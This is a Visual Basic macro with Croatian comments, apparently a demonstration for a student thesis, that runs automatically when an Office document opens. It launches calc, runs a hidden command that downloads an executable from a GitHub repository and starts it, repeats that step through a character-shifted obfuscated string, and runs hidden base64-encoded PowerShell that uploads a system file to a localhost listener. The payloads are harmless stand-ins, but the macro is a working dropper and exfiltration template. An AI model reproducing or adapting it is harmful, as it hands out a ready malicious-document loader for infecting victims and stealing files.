Sub Document_Open()

'pokretanje lokalnog binarya za primjer korištenja LOLBINa
    Dim objShell As Object
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "calc"
    
'preuzimanje i pokretanje remote datoteke za primjer stageava u malwareima
    Shell "cmd /c curl -L ""https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe"" --output preuzeto.exe && start preuzeto.exe", vbHide

'obfuscirano preuzimanje i pokretanje remote datoteke
aeQd = "": For i = 1 To 146: aeQd = aeQd + Chr(Asc(Mid("dne!0d!dvsm!.M!##iuuqt;00hjuivc/dpn0bdqxjoufst0[bwstoj`Sbe0sbx0nbjo0dbmd/fyf##!..pvuqvu!qsfv{fup`pcgvtdjsbop/fyf!''!tubsu!qsfv{fup`pcgvtdjsbop/fyf", i, 1)) - (1)): Next
Shell aeQd, vbHide

'upload calc.exe na localhost za primjer exfiltracije podataka
    Dim exfil As String
    exfil = exfil & "powershell.exe -nop -w hidden -e ""YwB1AHIAbAAuAGUAeABlACAALQBYACAAUABPAFMAVAAg"
    exfil = exfil & "AC0ARgAgACIAZgBpAGwAZQA9AEAAQwA6AFwAVwBpA"""
    exfil = exfil & "G4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAG"""
    exfil = exfil & "MAYQBsAGMALgBlAHgAZQAiACAAaAB0AHQAcAA6AC8"""
    exfil = exfil & "ALwAxADIANwAuADAALgAwAC4AMQA6ADgAMAAwADAA"""
    CreateObject("Wscript.Shell").Run exfil, 0

End Sub
